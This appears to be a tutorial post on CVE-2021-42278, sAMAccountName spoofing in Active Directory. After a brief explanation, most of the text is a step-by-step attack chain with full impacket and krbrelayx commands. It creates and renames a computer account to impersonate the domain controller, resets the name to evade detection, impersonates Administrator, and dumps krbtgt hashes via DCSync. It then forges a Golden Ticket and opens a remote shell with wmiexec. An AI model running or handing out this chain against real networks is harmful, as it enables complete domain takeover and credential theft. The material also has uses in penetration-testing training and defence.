## What is sAMAccountName spoofing ?

**sAMAccountName** is the unique ID for a user, it looks like this: NETBIOS\USERNAME.

Computer accounts should have a trailing \$ in their name (MYNETWORK\Computer\$).

However, until 2021 there was no validation to enforce this rule. This lack of validation led to **CVE-2021-42278, also known as sAMAccountName spoofing.**

By exploiting this, an attacker can rename a computer account so that its sAMAccountName matches that of a **Domain Controller (DC)**. Once this is done, Kerberos authentication can be tricked into treating the attacker-controlled computer as if it were the **DC itself.**

Why is this dangerous?
Because once you can impersonate the DC account, **you can escalate directly to domain admin privileges** and perform critical attacks like forging a Golden Ticket.

**But keep in mind that we need a user that has the right to create accounts in order to do the attack!**

## Example (with impacket tools and krbrelayx on UNIX-like systems):

#### sAMAccountName spoofing steps

These are the steps of the attack (I do imply that you already have the DC name and IP through enumeration and that you also have an account with the correct rights):

1. We need to create a computer account that will impersonate our target (DC):

```
python /usr/share/doc/python3-impacket/examples/addcomputer.py \
  -computer-name 'ControlledComputer$' \
  -computer-pass 'ComputerPassword' \
  -dc-host '<ip dc>' \
  -domain-netbios '<netbios>' \
  '<domain>/<user with right to create account>:<pass>'
```

We create a fake account with a simple password that will later become the fake DC.

2. We need to clear its SPNs. Why? When you create a new computer account (ControlledComputer\$), AD automatically assigns default SPNs (like HOST/ControlledComputer). If we don’t clear them before renaming the account to impersonate the DC, Kerberos could detect inconsistencies or conflicts with the real DC’s SPNs.

```
python krbrelayx/addspn.py \
  --clear \
  -t 'ControlledComputer$' \
  -d '<domain>' \
  -u '<AD>\<User>' \
  -p '<pass>' \
  '<ip>'
```

We still use the account that has the right to create accounts here.

3. Impersonate the DC by renaming our computer account to match the DC:

```
python /usr/share/doc/python3-impacket/examples/renameMachine.py \
  -current-name 'ControlledComputer$' \
  -new-name '<DC name without $>' \
  -dc-ip '<the ip of dc>' \
  '<domain>/<user>:<pass>'
```

Same user as usual.

4. Request a TGT.

First of all, don’t forget that working with Kerberos means that you need to be on the same local time!

```
timedatectl set-ntp off  
sudo ntpdate -u <ip of target>
```

This will set the same time as the target.

```
python /usr/share/doc/python3-impacket/examples/getTGT.py \
  -dc-ip '<ip of the dc>' \
  '<domain>/<Fake DC name set in step 3>:<the simple password set in step 1>'
```

5. Reset the computer name back (because we don’t need it anymore and it makes detection harder):

```
python /usr/share/doc/python3-impacket/examples/renameMachine.py \
  -current-name '<fake dc>' \           
  -new-name 'ControlledComputer$' \
  -dc-ip '<ip of the dc>' \
  '<domain>/<user>:<pass>'
```

We reuse the account with rights.

6. Use S4U2self to impersonate an account (example: Administrator):

```
KRB5CCNAME=<name of dc>.ccache 

python /usr/share/doc/python3-impacket/examples/getST.py \
  -self -impersonate 'Administrator' \
  -altservice 'cifs/<FAKE_DC.domain>' \
  -k -no-pass \
  -dc-ip '<ip of the dc>' \
  '<domain>/<FAKE_DC>'
```

Remember that this is still the Fake DC name set in step 3! (DC name without \$)

7. Perform DCSync with the forged ticket:

```
export KRB5CCNAME="<the ticket we obtained in step 6.ccache>"

python /usr/share/doc/python3-impacket/examples/secretsdump.py \
  -just-dc-user 'krbtgt' \
  -k -no-pass \
  -target-ip '<ip of the dc>' \
  -dc-ip '<ip of the dc>' \
  '<domain>/<user impersonated: Administrator for example>@<DC name without $.domain>'
```

We target krbtgt because this is the account hash we need in order to make a Golden Ticket.

If everything goes well, we might get some hashes:

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d392e902a67ba8e183135f229e385436:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d427015dbaa730ccfb5a58fb28e6dfeabde15c8e90caedbaa8ea84a0421bcc6e
krbtgt:aes128-cts-hmac-sha1-96:1e57ed1194e17a2a81be28d263f1c321
krbtgt:des-cbc-md5:fd40a2ec9dc76880
[*] Cleaning up... 
```
Perfect, we can now forge golden ticket !

#### Golden TIcket => SHELL.

We usually use AES256.

The only step remaining is to get the SID of the domain:

```
lookupsid.py \                                                   
  -k -no-pass \
  '<domain>/<user impersonated: Administrator for example>@<DC name without $.domain>' \
  -target-ip '<ip of the dc>'
```

Once we have it:

```
python /usr/share/doc/python3-impacket/examples/ticketer.py \
  -aesKey <AES256 hash> \
  -domain-sid '<SID>' \
  -domain '<domain>' \
  -user-id 500 \
  Administrator
```

User-id 500 if admin.

Then we import the ticket:

`export KRB5CCNAME=$(pwd)/<generated ticket.ccache>`

And use it! (example with a shell):

```
wmiexec.py -k -no-pass -dc-ip <ip of the dc> -target-ip <target of the shell> <domain>/<user impersonated: Administrator for example>@<DC NAME without $.local>
```
